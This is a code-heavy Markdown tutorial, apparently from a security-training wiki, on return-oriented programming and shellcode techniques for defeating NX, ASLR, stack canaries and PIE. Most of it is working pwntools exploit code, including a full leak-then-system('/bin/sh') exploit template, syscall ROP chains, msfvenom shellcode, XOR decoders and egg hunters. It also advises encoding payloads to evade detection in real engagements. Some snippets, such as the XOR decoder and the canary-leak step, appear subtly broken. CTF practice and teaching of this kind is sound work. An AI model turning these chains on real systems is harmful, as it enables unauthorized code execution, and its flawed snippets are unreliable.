---
icon: turn-down-left
---

# Advanced ROP & Shellcode Techniques

## **Advanced ROP & Shellcode Techniques — Bending Memory to Your Will**

***

Modern systems are armored with layers of protection: **NX, ASLR, stack canaries, PIE, RELRO** — all designed to make exploitation harder.\
But with **Return-Oriented Programming (ROP)** and **custom shellcode**, you can still gain execution in hardened environments.

This section transforms your exploit knowledge into real **post-mitigation offense** — the ability to bypass modern defenses and execute arbitrary payloads like a pro.

***

### I. 🧩 Advanced Memory Protections Overview

| Protection                                | Description                  | Bypass Technique                                        |
| ----------------------------------------- | ---------------------------- | ------------------------------------------------------- |
| **NX / DEP**                              | Stack is non-executable.     | Use ROP to invoke syscalls (e.g. `mprotect`, `execve`). |
| **ASLR**                                  | Randomizes memory addresses. | Leak addresses via format string or GOT.                |
| **Stack Canary**                          | Detects stack corruption.    | Leak canary, brute-force in local CTFs.                 |
| **PIE (Position Independent Executable)** | Randomizes base of binary.   | Leak binary base and rebase addresses.                  |
| **RELRO (Full / Partial)**                | Protects GOT from overwrite. | Use ROP instead of GOT overwrite.                       |

***

### II. ⚙️ Advanced ROP Building Blocks

#### 🧩 1. Finding Gadgets

```bash
ROPgadget --binary vuln | grep "pop rdi"
ropper --file vuln --search "pop rdi"
```

#### 🧠 2. Building ROP Chains

```python
from pwn import *
elf = context.binary = ELF('./vuln')
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0])     # Stack alignment
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(next(elf.search(b'/bin/sh\x00')))
rop.raw(elf.symbols['system'])
print(rop.dump())
```

***

### III. 💣 Stack Alignment (Ret-Sled Trick)

When `system("/bin/sh")` crashes with segmentation faults, alignment is off.\
Fix by adding a `ret` gadget before your chain:

```python
payload = b"A"*offset + p64(rop.find_gadget(['ret'])[0]) + rop.chain()
```

***

### IV. 🧠 Leaking Memory Addresses (Defeating ASLR)

#### 🧩 Leak libc address

```python
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
payload = b"A"*offset + rop.chain()
p.sendline(payload)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(leaked))
```

#### 🧠 Calculate libc base

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked - libc.symbols['puts']
```

Now you can call:

```python
rop = ROP(libc)
rop.call('system', [next(libc.search(b"/bin/sh\x00"))])
```

***

### V. ⚙️ Ret2libc Attack (No Shellcode, No ExecStack)

**Goal:** Call existing functions in libc (like `system("/bin/sh")`).

#### 💣 Classic Example

```python
payload = b"A"*offset
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols['system'])
```

**Bypasses:** NX, execstack disabled.\
**Limitation:** Requires address leaks (ASLR handling).

***

### VI. 🧠 Ret2syscall (Direct Syscall Execution)

When libc is unavailable, make syscalls directly with ROP:

```python
rop.raw(rop.find_gadget(['pop rax','ret'])[0])
rop.raw(59)  # execve syscall
rop.raw(rop.find_gadget(['pop rdi','ret'])[0])
rop.raw(next(elf.search(b"/bin/sh\x00")))
rop.raw(rop.find_gadget(['pop rsi','ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['pop rdx','ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['syscall','ret'])[0])
```

This invokes `execve("/bin/sh", 0, 0)` manually.

***

### VII. 🧬 Stack Canary Bypass

#### 🧠 Leak Canary

```python
payload = b"A"*offset
payload += b"%p " * 10
```

If you see something like `0x41414100`, that’s your canary.\
Rebuild payload:

```python
payload = b"A"*offset + p64(canary) + b"B"*8 + rop.chain()
```

***

### VIII. ⚙️ PIE Bypass (Dynamic Base Address)

Leak a known function’s address → calculate binary base:

```python
leak = u64(p.recv(6).ljust(8,b'\x00'))
elf.address = leak - elf.symbols['main']
```

Then rebuild ROP chain using rebased offsets:

```python
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
```

***

### IX. 💣 Chaining Syscalls for File Read/Write

#### 🧠 Open → Read → Write (ROP Chain)

```python
rop.raw(pop_rdi); rop.raw(next(elf.search(b"flag.txt\x00")))
rop.raw(pop_rax); rop.raw(2)  # open()
rop.raw(syscall)
rop.raw(pop_rdi); rop.raw(3)  # file descriptor
rop.raw(pop_rsi); rop.raw(bss_section)
rop.raw(pop_rdx); rop.raw(100)
rop.raw(pop_rax); rop.raw(0)  # read()
rop.raw(syscall)
rop.raw(pop_rdi); rop.raw(1)
rop.raw(pop_rsi); rop.raw(bss_section)
rop.raw(pop_rax); rop.raw(1)  # write()
rop.raw(syscall)
```

Result → Reads and prints `flag.txt` even on NX-enabled systems.

***

### X. 🧠 Shellcode Optimization & Obfuscation

#### 🔹 Null-Free Shellcode

```bash
msfvenom -p linux/x64/exec CMD="/bin/sh" -b "\x00\x0a\x0d" -f python
```

#### 🔹 Encode + Decode On Stack

```asm
; XOR-encoded shellcode
xor_loop:
    xor byte [rsi], 0xAA
    inc rsi
    loop xor_loop
    jmp rsi
```

#### 🔹 Egg Hunter (Find Shellcode in Memory)

```asm
mov eax, 0x50905090   ; egg marker
next_page:
inc ebx
cmp [ebx], eax
jne next_page
jmp ebx
```

***

### XI. ⚙️ Jump-Oriented Programming (JOP)

When `ret` instructions are unavailable (ROP mitigated), use `jmp`-based gadgets.

```python
ROPgadget --binary vuln --only "jmp|call"
```

Chain gadgets performing control flow through indirect jumps.

***

### XII. 💀 Advanced Example: ASLR + NX Bypass (Full Exploit)

```python
from pwn import *
context.binary = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# Step 1: Leak libc address
rop = ROP(context.binary)
rop.puts(context.binary.got['puts'])
rop.call(context.binary.symbols['main'])
payload = b"A"*72 + rop.chain()
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.symbols['puts']

# Step 2: Return to system("/bin/sh")
rop = ROP(libc)
rop.call('system', [next(libc.search(b"/bin/sh\x00"))])
payload = b"A"*72 + rop.chain()
p.sendline(payload)
p.interactive()
```

✅ Works even with **NX + ASLR** fully enabled.

***

### XIII. 🧠 Common Gadgets Cheat Sheet

| Gadget                | Purpose             |
| --------------------- | ------------------- |
| `pop rdi; ret`        | Set first argument  |
| `pop rsi; ret`        | Set second argument |
| `pop rdx; ret`        | Set third argument  |
| `pop rax; ret`        | Set syscall number  |
| `syscall; ret`        | Trigger syscall     |
| `mov [rdi], rsi; ret` | Memory write        |
| `leave; ret`          | Stack pivot         |
| `jmp rsp`             | Shellcode jump      |

***

### XIV. ⚙️ Stack Pivoting (When Stack Is Read-Only)

Redirect `rsp` to writable memory (like `.bss`):

```python
rop.raw(rop.find_gadget(['pop rsp', 'ret'])[0])
rop.raw(elf.bss(0x500))
```

Now your payload executes from `.bss` memory instead of the stack.

***

### XV. 🧩 Combining ROP + Shellcode (Hybrid Attack)

If partial NX exists (stack non-executable, heap executable):

1. Use ROP to `mprotect()` heap as executable.
2. Jump to shellcode in heap.

```python
rop.call('mprotect', [heap, 0x1000, 7])
rop.raw(heap)
```

***

### XVI. ⚔️ Pro Tips & Red Team Tricks

✅ **Chain Reuse:**\
Reuse ROP chains across binaries with similar architectures.

✅ **Speed:**\
Automate exploit crafting with pwntools templates and ROPgadget filters.

✅ **Visualization:**\
Use `pwndbg context` to visualize stack + register states at each step.

✅ **Heap + Stack Pivot:**\
Use heap-controlled memory to rebuild fake stacks when stack space is small.

✅ **OPSEC:**\
Encode or compress payloads to reduce detection in real-world engagements.

***

### XVII. 🧠 Practice Targets for Advanced Exploitation

| Platform                           | Focus                     |
| ---------------------------------- | ------------------------- |
| **ROP Emporium**                   | ROP / Ret2libc / Syscalls |
| **pwnable.tw**                     | Heap + custom shellcode   |
| **Exploit-Education Fusion**       | Canary, PIE, NX, ASLR     |
| **HackTheBox - Rope2 / Brainfuck** | Real-world mitigations    |
| **CTFtime**                        | Advanced pwn challenges   |

***

### XVIII. ⚙️ Quick Reference Table

| Technique         | Bypasses     | Example Tool  |
| ----------------- | ------------ | ------------- |
| Ret2libc          | NX           | Pwntools      |
| Ret2syscall       | NX + No libc | ROPgadget     |
| ROP Chain         | NX + RELRO   | Ropper        |
| Leak + Rebase     | ASLR + PIE   | Pwntools      |
| Stack Canary Leak | Canary       | Format string |
| Heap Pivot        | RWX bypass   | GDB / Pwndbg  |

***
